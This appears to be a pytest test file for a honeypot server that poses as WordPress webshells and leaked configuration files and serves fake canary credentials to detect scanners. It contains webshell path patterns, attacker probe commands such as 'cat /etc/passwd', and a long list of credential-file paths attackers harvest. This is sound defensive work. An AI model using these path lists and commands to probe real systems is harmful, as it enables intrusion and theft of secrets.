"""Tests for flux.server."""
from __future__ import annotations

import base64
import hashlib
import json
import re

import pytest

from flux import server as tbenv


def test_default_webshell_paths_include_azure_wp_checker_anchor():
    """The Azure WP Webshell Checker anchor (hellopress/wp_filemanager.php)
    plus all observed short-named PHPs from the April 2026 burst must match."""
    must_match = [
        "/wp-content/plugins/hellopress/wp_filemanager.php",
        "/hellopress/wp_filemanager.php",
        "/doc.php",
        "/ws80.php",
        "/bthil.php",
        "/xminie.php",
        "/inputs.php",
        "/ioxi-o.php",
        "/8.php",
        "/an.php",
        "/kma.php",
        "/ssh3ll.php",
        "/new4.php",
        "/sf.php",
    ]
    for path in must_match:
        assert tbenv.is_webshell_path(path), f"expected webshell match: {path}"


def test_default_webshell_paths_include_style_php_family():
    """style.php is a recurring webshell-rename: legitimate WordPress serves
    style.css, never style.php, so any /style.php — at the root or under any of
    the four standard WP directory prefixes — is the scanner's confirmation
    fingerprint. The bare /js/style.php and /wp-style.php variants share the
    same intent."""
    must_match = [
        "/style.php",
        "/wp-style.php",
        "/wp-admin/style.php",
        "/wp-content/style.php",
        "/wp-content/themes/style.php",
        "/wp-includes/style.php",
        "/js/style.php",
    ]
    for path in must_match:
        assert tbenv.is_webshell_path(path), f"expected webshell match: {path}"


def test_style_css_is_not_a_webshell_path():
    """The .css cousin is the legitimate WP file and must stay 404 so we
    don't mistake real-browser fetches for scanner traffic."""
    for path in [
        "/style.css",
        "/wp-content/style.css",
        "/wp-content/themes/twentytwentyfour/style.css",
    ]:
        assert not tbenv.is_webshell_path(path), f"unexpected match: {path}"


def test_webshell_path_is_case_insensitive():
    assert tbenv.is_webshell_path("/WP-Content/Plugins/HelloPress/WP_FILEMANAGER.PHP")


def test_non_webshell_path_does_not_match():
    for path in ["/", "/.env", "/index.html", "/wp-login.php"]:
        assert not tbenv.is_webshell_path(path)


def test_webshell_path_regexes_match_well_known_php_shells():
    """The /.well-known/<name>.php pattern is used as a shell-drop directory
    (writable by the certbot user on many LAMP boxes). Scanners probe a rotating
    set of filenames there."""
    for path in [
        "/.well-known/rk2.php",
        "/.well-known/gecko-litespeed.php",
        "/.well-known/admin.php",
        "/.well-known/error.php",
        "/.well-known/index.php",
        "/.WELL-KNOWN/RK2.PHP",
    ]:
        assert tbenv.is_webshell_path(path), f"expected match: {path}"


def test_webshell_regex_excludes_well_known_acme_challenge():
    """nginx routes /.well-known/acme-challenge/ to the LE webroot, not flux,
    but even if it did hit flux we shouldn't trap on it — legit cert renewals
    would fire the shell dispatch path. The regex only matches <name>.php, not
    subdirectory tokens."""
    assert not tbenv.is_webshell_path("/.well-known/acme-challenge/")
    assert not tbenv.is_webshell_path("/.well-known/acme-challenge/abc123")


def test_webshell_regex_matches_numbered_trash_directories():
    """Numbered /.trash<N>/ and /.tmb/ staging paths are a specific malware
    family's shell-drop convention."""
    for path in [
        "/.trash7206/index.php",
        "/.trash7309/f/",
        "/.trash99/",
        "/.tmb/shell.php",
        "/.tresh/index.php",
        "/.dj/index.php",
        "/.alf/index.php",
        "/.mopj.php",
        "/.info.php",
    ]:
        assert tbenv.is_webshell_path(path), f"expected match: {path}"


def test_webshell_regex_rejects_benign_hidden_dirs():
    """Dot-directories we do NOT want to snag (other canary traps own some of
    these, and legitimate framework paths use others)."""
    for path in [
        "/.env",
        "/.git/HEAD",
        "/.ssh/authorized_keys",
        "/.aws/credentials",
        "/.well-known/openid-configuration",   # standards-defined non-.php
        "/.trash",                              # bare name, no numbered dir
    ]:
        assert not tbenv.is_webshell_path(path), f"unexpected match: {path}"


def test_parse_cookies_basic():
    result = tbenv.parse_cookies("sid=abc; cmd=id; _hp_tid=xyz")
    assert result == {"sid": "abc", "cmd": "id", "_hp_tid": "xyz"}


def test_parse_cookies_empty():
    assert tbenv.parse_cookies("") == {}


def test_parse_form_body_urlencoded():
    body = b"cmd=id&x=y&empty="
    result = tbenv.parse_form_body(body, "application/x-www-form-urlencoded")
    assert result == {"cmd": ["id"], "x": ["y"], "empty": [""]}


def test_parse_form_body_ignores_non_form_content_type():
    """JSON body shouldn't be parsed as form data; we want to see it in bodyPreview instead."""
    assert tbenv.parse_form_body(b'{"cmd":"id"}', "application/json") == {}


def test_parse_form_body_treats_missing_content_type_as_form():
    """Many shell clients omit Content-Type entirely."""
    assert tbenv.parse_form_body(b"cmd=id", "") == {"cmd": ["id"]}


class _FakeHeaders(dict):
    def get(self, key, default=""):  # case-insensitive like HTTPMessage
        for k, v in self.items():
            if k.lower() == key.lower():
                return v
        return default


def test_extract_webshell_command_from_query():
    source, key, cmd = tbenv.extract_webshell_command(
        {"cmd": ["id"]}, {}, {}, _FakeHeaders(),
    )
    assert (source, key, cmd) == ("query", "cmd", "id")


def test_extract_webshell_command_from_form():
    source, key, cmd = tbenv.extract_webshell_command(
        {}, {"command": ["whoami"]}, {}, _FakeHeaders(),
    )
    assert (source, key, cmd) == ("form", "command", "whoami")


def test_extract_webshell_command_prefers_query_over_form():
    """Scanners sometimes set both; query-string is the more common observed channel."""
    source, key, cmd = tbenv.extract_webshell_command(
        {"c": ["from_query"]}, {"c": ["from_form"]}, {}, _FakeHeaders(),
    )
    assert source == "query"
    assert cmd == "from_query"


def test_extract_webshell_command_from_cookie():
    source, key, cmd = tbenv.extract_webshell_command(
        {}, {}, {"cmd": "uname -a"}, _FakeHeaders(),
    )
    assert (source, key, cmd) == ("cookie", "cmd", "uname -a")


def test_extract_webshell_command_from_header():
    headers = _FakeHeaders({"X-Cmd": "id"})
    source, key, cmd = tbenv.extract_webshell_command({}, {}, {}, headers)
    assert source == "header"
    assert cmd == "id"


def test_extract_webshell_command_none():
    source, key, cmd = tbenv.extract_webshell_command({}, {}, {}, _FakeHeaders())
    assert (source, key, cmd) == ("", "", "")


def test_extract_webshell_command_case_variant_param_name():
    """Some shells use uppercase CMD."""
    source, key, cmd = tbenv.extract_webshell_command(
        {"CMD": ["id"]}, {}, {}, _FakeHeaders(),
    )
    assert source == "query"
    assert cmd == "id"


def test_simulate_command_output_id():
    assert "uid=33(www-data)" in tbenv.simulate_command_output("id")


def test_simulate_command_output_whoami():
    assert tbenv.simulate_command_output("whoami").strip() == "www-data"


def test_simulate_command_output_uname():
    out = tbenv.simulate_command_output("uname -a")
    assert "Linux" in out and "GNU/Linux" in out


def test_simulate_command_output_cat_etc_passwd():
    out = tbenv.simulate_command_output("cat /etc/passwd")
    assert "root:x:0:0" in out
    assert "www-data" in out


def test_simulate_command_output_unknown_empty():
    """Unknown commands return empty output rather than an error banner,
    so the response looks like a silently-run command."""
    assert tbenv.simulate_command_output("some_fake_bin --flag") == ""


def test_simulate_command_output_empty_input():
    assert tbenv.simulate_command_output("") == ""


def test_render_webshell_page_includes_form_and_command():
    html = tbenv.render_webshell_page(command="id", output="uid=33")
    assert b"<form" in html
    assert b"name='cmd'" in html
    assert b"id" in html
    assert b"uid=33" in html


def test_render_webshell_page_escapes_html():
    html = tbenv.render_webshell_page(command="<script>alert(1)</script>", output="")
    assert b"<script>" not in html
    assert b"&lt;script&gt;" in html


def test_render_webshell_page_empty_is_still_valid():
    html = tbenv.render_webshell_page()
    assert html.startswith(b"<!doctype html>")
    assert b"File Manager" in html


def test_webshell_disabled_returns_false_even_for_anchor_path(monkeypatch):
    monkeypatch.setattr(tbenv, "WEBSHELL_ENABLED", False)
    assert not tbenv.is_webshell_path(
        "/wp-content/plugins/hellopress/wp_filemanager.php",
    )


# --- End-to-end dispatch tests (gate behavior) ---
#
# Use pytest-aiohttp's aiohttp_client fixture: a real aiohttp server bound to
# a random port in the test event loop, hit with an HTTP client. Mocks the
# Tracebit call at the module level via monkeypatch so tests stay offline.


import pytest_asyncio


@pytest_asyncio.fixture
async def flux_client(aiohttp_client, monkeypatch, tmp_path):
    """Spin up the real aiohttp app; return a TestClient ready to hit it.
    Routes LOG_PATH to tmp_path so each test gets its own log file."""
    monkeypatch.setattr(tbenv, "LOG_PATH", tmp_path / "env-canary.jsonl")
    app = tbenv.create_app()
    client = await aiohttp_client(app)
    client.log_path = tmp_path / "env-canary.jsonl"
    return client


def _log_entries(log_path):
    import json
    return [json.loads(line) for line in log_path.read_text().splitlines()]


async def test_dispatch_serves_webshell_when_host_is_spoofed(flux_client, monkeypatch):
    """Scanner with a spoofed Host header still gets the webshell response —
    flux serves traps regardless of Host."""
    monkeypatch.setattr(tbenv, "WEBSHELL_ENABLED", True)
    resp = await flux_client.get(
        "/wp-content/plugins/hellopress/wp_filemanager.php",
        headers={
            "X-Forwarded-Host": "staging.victim.example",
            "X-Forwarded-For": "203.0.113.7",
            "X-Forwarded-Proto": "https",
        },
    )
    assert resp.status == 200
    body = await resp.read()
    assert b"File Manager" in body
    entries = _log_entries(flux_client.log_path)
    assert len(entries) == 1
    assert entries[0]["result"] == "webshell-probe"
    assert entries[0]["clientIp"] == "203.0.113.7"


async def test_dispatch_webshell_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "WEBSHELL_ENABLED", False)
    resp = await flux_client.get(
        "/wp-content/plugins/hellopress/wp_filemanager.php",
        headers={"X-Forwarded-For": "203.0.113.7"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert len(entries) == 1
    assert entries[0]["result"] == "not-handled"


async def test_dispatch_without_tracebit_api_key_404s_env_and_git(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "")
    monkeypatch.setattr(tbenv, "FAKE_GIT_ENABLED", True)
    for path in ["/.env", "/.git/HEAD", "/.git/config"]:
        resp = await flux_client.get(path, headers={"X-Forwarded-For": "203.0.113.8"})
        assert resp.status == 404, f"expected 404 for {path} without API_KEY"


# --- Fingerprint paths ---


def test_is_fingerprint_path_defaults_match_generic_paths():
    """Fingerprinting is on by default for the built-in generic paths."""
    assert tbenv.FINGERPRINT_PATHS_ENABLED, (
        "FINGERPRINT_PATHS_ENABLED should default to True — flux is a honeypot"
    )
    for path in ["/", "/index.html", "/index.php", "/robots.txt", "/sitemap.xml", "/favicon.ico"]:
        assert tbenv.is_fingerprint_path(path), f"expected match: {path}"


def test_is_fingerprint_path_respects_explicit_disable(monkeypatch):
    monkeypatch.setattr(tbenv, "FINGERPRINT_PATHS_ENABLED", False)
    assert not tbenv.is_fingerprint_path("/")
    assert not tbenv.is_fingerprint_path("/index.html")


def test_tarpit_modules_default_on():
    """All fingerprint modules default to on. A user who explicitly disables
    one via env var still wins; the defaults just mean a fresh sensor
    already fingerprints without any extra env tuning."""
    assert tbenv.MOD_COOKIE_ENABLED
    assert tbenv.MOD_ETAG_PROBE_ENABLED
    assert tbenv.MOD_REDIRECT_CHAIN_ENABLED
    assert tbenv.MOD_VARIABLE_DRIP_ENABLED
    assert tbenv.MOD_CONTENT_LENGTH_MISMATCH_ENABLED
    # DNS callback is default-on but is a no-op unless the domain is set.
    assert tbenv.MOD_DNS_CALLBACK_ENABLED


def test_all_trap_families_default_on():
    """Every trap master-switch defaults to on — flux is a honeypot, the
    whole point is to run every trap that's cheap to run. Deployments that
    lack TRACEBIT_API_KEY still 404 the canary-backed traps (/.env,
    /.git/*, canary file table) at dispatch time."""
    assert tbenv.TARPIT_ENABLED
    assert tbenv.FINGERPRINT_PATHS_ENABLED
    assert tbenv.CANARY_TRAPS_ENABLED
    assert tbenv.FAKE_GIT_ENABLED, (
        "FAKE_GIT_ENABLED should default to True — the per-IP cache bounds "
        "quota burn and the dispatch still requires TRACEBIT_API_KEY."
    )
    assert tbenv.WEBSHELL_ENABLED
    assert tbenv.LLM_ENDPOINT_ENABLED
    assert tbenv.SONICWALL_ENABLED
    assert tbenv.CISCO_WEBVPN_ENABLED
    assert tbenv.IVANTI_VPN_ENABLED
    assert tbenv.ASPERA_FASPEX_ENABLED
    assert tbenv.FORTIGATE_VPN_ENABLED
    assert tbenv.HIKVISION_ENABLED
    assert tbenv.HNAP1_ENABLED
    assert tbenv.GEOSERVER_ENABLED
    assert tbenv.COLDFUSION_ENABLED
    assert tbenv.CONFLUENCE_ENABLED
    assert tbenv.NEXTJS_ENABLED
    assert tbenv.CMD_INJECTION_ENABLED


def test_tarpit_enabled_by_default():
    assert tbenv.TARPIT_ENABLED


@pytest.mark.parametrize("path", [
    # Regression: dispatch order in `handle()` runs the tarpit check
    # before the canary-trap lookup, so any path that matches both was
    # silently shadowed by tarpit and never reached the canary
    # renderer. `is_tarpit_path` now exempts paths with a CanaryTrap
    # entry so the canary fires as documented.
    "/.env.production",
    "/.env.prod",
    "/.env.live",
    "/.env.vault",
    "/.env.vault.bak",
    "/.env.vault.example",
    "/mailer/.env",
])
def test_canary_trap_paths_do_not_match_tarpit(path):
    assert path.lower() in tbenv._TRAP_BY_PATH, (
        f"{path!r} should be a CanaryTrap entry"
    )
    assert not tbenv.is_tarpit_path(path), (
        f"{path!r} matches is_tarpit_path — tarpit dispatch (line 6806) "
        f"runs before canary dispatch and would shadow the canary trap"
    )


# --- Canary-backed file traps ---

FAKE_TRACEBIT = {
    "aws": {
        "awsAccessKeyId": "AKIAFAKEEXAMPLE01",
        "awsSecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "awsSessionToken": "FwoGZXIvYXdzEXAMPLEFAKE=",
        "awsExpiration": "2030-01-01T00:00:00Z",
        "awsConfirmationId": "conf-aws-1",
    },
    "ssh": {
        "sshIp": "203.0.113.99",
        "sshPrivateKey": "-----BEGIN OPENSSH PRIVATE KEY-----\nFAKEKEY\n-----END OPENSSH PRIVATE KEY-----",
        "sshPublicKey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE canary@flux",
        "sshExpiration": "2030-01-01T00:00:00Z",
        "sshConfirmationId": "conf-ssh-1",
    },
    "http": {
        "gitlab-username-password": {
            "credentials": {"username": "deploybot42", "password": "p@ssCanaryValue"},
            "hostNames": ["gitlab.canary.example"],
            "expiresAt": "2030-01-01T00:00:00Z",
            "browserDeploymentId": "bd-gup-1",
            "confirmationId": "conf-gup-1",
        },
        "gitlab-cookie": {
            "credentials": {"name": "_gitlab_session", "value": "cookieCanaryValue"},
            "hostNames": ["gitlab.canary.example"],
            "expiresAt": "2030-01-01T00:00:00Z",
            "browserDeploymentId": "bd-gc-1",
            "confirmationId": "conf-gc-1",
        },
    },
}


@pytest.mark.parametrize("path,needle", [
    ("/.aws/credentials", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    ("/.aws/config", b"aws_access_key_id = AKIAFAKEEXAMPLE01"),
    ("/.pgpass", b":deploybot42:p@ssCanaryValue"),
    ("/.claude/.credentials.json", b'"accessToken": "AKIAFAKEEXAMPLE01"'),
    ("/wp-config.php", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php.old", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php.save", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php.txt", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php.swp", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php~", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config.php::$data", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/wp-config-backup.php", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/backup/wp-config.php", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/%77%70%2d%63%6f%6e%66%69%67.%70%68%70.%62%61%6b", b"define('AWS_ACCESS_KEY_ID', 'AKIAFAKEEXAMPLE01');"),
    ("/backup.sql", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/config.json", b'"access_key_id": "AKIAFAKEEXAMPLE01"'),
    ("/firebase.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
    ("/firebase-adminsdk.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
    ("/gcp-service-account.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
    ("/.config/gcloud/application_default_credentials.json", b'"private_key_id": "AKIAFAKEEXAMPLE01"'),
    ("/.docker/config.json", b'"auths"'),
    ("/docker-compose.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/docker-compose.prod.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/docker-compose.production.yaml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/docker-compose.staging.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/docker-compose.override.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/.github/workflows/ci.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/.gitlab-ci.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/jenkinsfile", b"AWS_ACCESS_KEY_ID = 'AKIAFAKEEXAMPLE01'"),
    ("/bitbucket-pipelines.yml", b"export AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/appveyor.yml", b"AWS_ACCESS_KEY_ID: AKIAFAKEEXAMPLE01"),
    ("/actuator/env", b'"AWS_ACCESS_KEY_ID"'),
    ("/actuator/env", b'"value": "AKIAFAKEEXAMPLE01"'),
    ("/env", b'"activeProfiles"'),
    ("/manage/env", b'"activeProfiles"'),
    ("/management/env", b"applicationConfig"),
    ("/api/actuator/env", b"applicationConfig"),
    # Spring Boot Actuator surface beyond /env — every endpoint emits
    # the canary AWS access key id in a place a credential harvester
    # would grep raw bytes for.
    ("/actuator/heapdump", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/actuator/heapdump", b"JAVA PROFILE 1.0.2"),
    ("/api/actuator/heapdump", b"AWS_SECRET_ACCESS_KEY="),
    ("/manage/heapdump", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/actuator/configprops", b'"accessKey": "AKIAFAKEEXAMPLE01"'),
    ("/actuator/configprops", b'"prefix": "spring.datasource"'),
    ("/management/configprops", b'"accessKey": "AKIAFAKEEXAMPLE01"'),
    ("/actuator/health", b'"status": "UP"'),
    ("/actuator/health", b'"accessKeyId": "AKIAFAKEEXAMPLE01"'),
    ("/api/actuator/health", b"jdbc:postgresql://prod_rw:"),
    ("/actuator/mappings", b"AKIAFAKEEXAMPLE01"),
    ("/actuator/mappings", b"dispatcherServlets"),
    ("/actuator/threaddump", b"AKIAFAKEEXAMPLE01"),
    ("/actuator/threaddump", b'"threadState"'),
    ("/application.properties", b"aws.access.key.id=AKIAFAKEEXAMPLE01"),
    ("/application.yml", b"access-key-id: AKIAFAKEEXAMPLE01"),
    ("/.env.production", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.prod", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.live", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/mailer/.env", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.vault", b"DOTENV_VAULT_PRODUCTION="),
    ("/.env.vault", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.vault.bak", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/.env.vault.example", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/debug/pprof/", b"heap profile:"),
    ("/debug/pprof/heap", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/debug/pprof/cmdline", b"AWS_SECRET_ACCESS_KEY="),
    ("/debug/pprof/goroutine", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/debug/pprof/allocs", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/api/debug/pprof/heap", b"AWS_ACCESS_KEY_ID=AKIAFAKEEXAMPLE01"),
    ("/phpinfo.php", b"AKIAFAKEEXAMPLE01"),
    ("/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_ed25519", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/.ssh/id_dsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/root/.ssh/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/home/.ssh/id_rsa", b"BEGIN OPENSSH PRIVATE KEY"),
    ("/authorized_keys", b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    ("/.ssh/authorized_keys2", b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    ("/static/.ssh/authorized_keys", b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    # The config + known_hosts traps are the other half of the IP↔key
    # pairing — without them, a harvested /id_rsa has no target to
    # replay against, so the canary can't fire.
    ("/.ssh/config", b"HostName 203.0.113.99"),
    ("/.ssh/config", b"IdentityFile ~/.ssh/id_rsa"),
    ("/.ssh/known_hosts", b"203.0.113.99 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    ("/known_hosts", b"203.0.113.99 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE"),
    ("/.netrc", b"login deploybot42"),
    ("/.git-credentials", b"https://deploybot42:"),
    ("/root/.git-credentials", b"https://deploybot42:"),
    ("/home/.git-credentials", b"https://deploybot42:"),
    ("/.npmrc", b"p@ssCanaryValue"),
    ("/root/.npmrc", b"p@ssCanaryValue"),
    ("/home/.npmrc", b"p@ssCanaryValue"),
    ("/root/.docker/config.json", b'"auths"'),
    ("/home/.docker/config.json", b'"auths"'),
    # Node.js dependency manifest set — canary userinfo on every URL.
    ("/yarn.lock", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/yarn.lock.bak", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/package-lock.json", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/package-lock.json.bak", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/var/backups/npm/package-lock.json.old", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/package.json", b"deploybot42:p%40ssCanaryValue@npm.internal-tools.lan"),
    ("/.yarnrc", b'"//npm.internal-tools.lan/:_authToken" "p@ssCanaryValue"'),
    ("/.yarnrc.yml", b'npmAuthToken: "p@ssCanaryValue"'),
    ("/.pypirc", b"username = deploybot42"),
    ("/api/v4/user", b'"username": "deploybot42"'),
    ("/users/sign_in", b"<title>Sign in"),
    # AI credential config files — the "probably-doesn't-make-sense"
    # caveat lives in server.py above render_openai_config_json. The
    # AWS canary value still gets embedded and shipped; field names are
    # OpenAI / Anthropic / Cursor-shaped so a grep-by-field scanner
    # still harvests it, even though a prefix-filter (sk-...) would
    # reject it.
    ("/.openai/config.json", b'"api_key": "AKIAFAKEEXAMPLE01"'),
    ("/.anthropic/config.json", b'"auth_token": "AKIAFAKEEXAMPLE01"'),
    ("/.cursor/mcp.json", b'"GITHUB_PERSONAL_ACCESS_TOKEN": "AKIAFAKEEXAMPLE01"'),
])
def test_canary_trap_renderers_embed_canary(path, needle):
    trap = tbenv._TRAP_BY_PATH[path]
    body = trap.render(FAKE_TRACEBIT)
    assert needle in body, f"expected {needle!r} in rendered {path}; got {body[:200]!r}"


@pytest.mark.parametrize("path", [
    "/wp-config.php",
    "/wp-config.php.old",
    "/application.properties",
    "/application.yml",
    "/.env.production",
    "/.env.vault",
    "/mailer/.env",
    "/debug/pprof/heap",
    "/phpinfo.php",
    "/.github/workflows/ci.yml",
    "/.gitlab-ci.yml",
    "/jenkinsfile",
    "/bitbucket-pipelines.yml",
    "/appveyor.yml",
])
def test_canary_trap_renderers_do_not_embed_fixed_password_literal(path):
    # Regression: the ``h6T!9pq2Wz@LmRnV`` / ``prod_rw`` DB-password literal
    # that used to be baked into these renderers acted as a cross-sensor
    # fingerprint — a scanner pulling /wp-config.php and /application.yml from
    # different hosts could confirm they were the same honeypot operator by
    # matching on the shared literal. DB-cred canaries aren't a thing in
    # Tracebit Community today (gitlab-username-password only fires against the
    # specific hosted gitlab URL, not arbitrary MySQL/Postgres endpoints), so
    # we substitute a per-hit random value instead. Assert the old literal is
    # gone AND that two renders produce different passwords.
    trap = tbenv._TRAP_BY_PATH[path]
    body_1 = trap.render(FAKE_TRACEBIT)
    body_2 = trap.render(FAKE_TRACEBIT)
    for fingerprint in (b"h6T!9pq2Wz@LmRnV", b"h6T!9pq2Wz"):
        assert fingerprint not in body_1, f"{path!r} still embeds fixed DB password literal"
    # Passwords generated from secrets.token_urlsafe(16) are ~22 chars — the
    # rendered bodies should differ somewhere. (Same AWS canary mock is used
    # for both, so anything that varies is necessarily the DB password.)
    assert body_1 != body_2, f"{path!r} renders identically across calls — password not randomized"


@pytest.mark.parametrize("path", [
    "/yarn.lock",
    "/yarn.lock.bak",
    "/package-lock.json",
    "/package-lock.json.bak",
    "/var/backups/npm/package-lock.json.old",
])
def test_node_deps_lockfiles_have_per_hit_unique_integrity(path):
    # Each render synthesises a fresh sha512 integrity hash per package
    # (`_fake_npm_integrity()`); two adjacent renders on different sensors
    # would otherwise share the same lockfile body and turn the fleet into
    # a single fingerprint. Same rule as the wp-config DB-password
    # regression — credential-shaped fields stay per-hit unique.
    trap = tbenv._TRAP_BY_PATH[path]
    body_1 = trap.render(FAKE_TRACEBIT)
    body_2 = trap.render(FAKE_TRACEBIT)
    assert b"sha512-" in body_1, f"{path!r} should embed sha512- integrity hashes"
    assert body_1 != body_2, f"{path!r} renders identically across calls — integrity not randomized"


def test_node_deps_canary_password_falls_back_to_synthetic_when_tracebit_missing():
    # If the Tracebit issuance failed, _node_deps_canary_userinfo falls
    # back to _fake_db_password() — never a fixed literal. This protects
    # against fleet-wide fingerprinting when canary minting hits a quota
    # ceiling.
    user_a, pw_a, host_a = tbenv._node_deps_canary_userinfo({})
    user_b, pw_b, host_b = tbenv._node_deps_canary_userinfo({})
    assert host_a == host_b == "npm.internal-tools.lan"
    assert user_a == user_b == "deploy"
    assert pw_a and pw_b, "fallback password must not be empty"
    assert pw_a != pw_b, "fallback password must be per-call unique"


def test_ssh_config_and_known_hosts_return_empty_when_ssh_missing():
    # If Tracebit didn't return an ssh block (e.g. the handler was asked
    # for aws-only by mistake), the config/known_hosts traps must render
    # an empty body rather than spraying a truncated IdentityFile stub or
    # a bare ``ssh-ed25519 AAAA`` line with no host.
    for r in ({"aws": {}}, {}, {"ssh": None}, {"ssh": {}}):
        assert tbenv.render_ssh_config(r) == b""
        assert tbenv.render_known_hosts(r) == b""


def test_ssh_renderers_base64_decode_tracebit_values():
    # Tracebit Community returns sshPrivateKey / sshPublicKey as base64
    # over the on-wire JSON. If flux serves the base64 verbatim on /id_rsa
    # an attacker running `ssh -i stolen_id_rsa` gets "invalid format" and
    # the canary never fires — which matches the dashboard reality of ~5
    # SSH canaries ever issued despite ~700 SSH-path hits/30d. Lock in the
    # decode so a future edit can't silently regress it.
    real_priv = "-----BEGIN OPENSSH PRIVATE KEY-----\nABC123\n-----END OPENSSH PRIVATE KEY-----\n"
    real_pub = "ssh-ed25519 AAAAC3Nza... canary@flux\n"
    response = {
        "ssh": {
            "sshPrivateKey": base64.b64encode(real_priv.encode()).decode(),
            "sshPublicKey": base64.b64encode(real_pub.encode()).decode(),
        },
    }
    assert tbenv.render_ssh_private_key(response).startswith(b"-----BEGIN OPENSSH PRIVATE KEY-----")
    assert tbenv.render_ssh_public_key(response).startswith(b"ssh-ed25519 ")
    assert b"ssh-ed25519 " in tbenv.render_authorized_keys(response)
    # ``format_env_payload`` deliberately names its env var ``_B64`` and
    # ships the raw base64 — scanners that exfil the line can decode it
    # themselves, and we don't want to double-decode.
    env_body = tbenv.format_env_payload(response)
    assert f"SSH_PRIVATE_KEY_B64={response['ssh']['sshPrivateKey']}" in env_body


def test_ssh_renderers_fallback_when_value_is_raw_pem():
    # Defensive: if the upstream format ever flips back to raw PEM
    # (or the fixture in tests passes PEM, as some older tests do), a
    # PEM string isn't valid base64 — the decoder falls through to the
    # raw value rather than exploding.
    response = {
        "ssh": {
            "sshPrivateKey": "-----BEGIN OPENSSH PRIVATE KEY-----\nFAKEKEY\n-----END OPENSSH PRIVATE KEY-----",
            "sshPublicKey": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKE canary@flux",
        },
    }
    assert b"BEGIN OPENSSH PRIVATE KEY" in tbenv.render_ssh_private_key(response)
    assert b"ssh-ed25519 AAAA" in tbenv.render_ssh_public_key(response)
    assert b"ssh-ed25519 AAAA" in tbenv.render_authorized_keys(response)


def test_render_env_production_database_url_is_parseable():
    # The DB password is random per hit and gets inlined into a postgres://
    # userinfo component. It must stay parseable so the rendered .env is
    # credible — secrets.token_urlsafe uses only [A-Za-z0-9_-], none of
    # which need percent-encoding inside URL userinfo.
    from urllib.parse import urlsplit
    body = tbenv.render_env_production(FAKE_TRACEBIT).decode("utf-8")
    db_line = next(line for line in body.splitlines() if line.startswith("DATABASE_URL="))
    parsed = urlsplit(db_line.split("=", 1)[1])
    assert parsed.scheme == "postgresql"
    assert parsed.username == "prod_rw"
    assert parsed.password  # non-empty
    assert parsed.hostname == "db.internal"


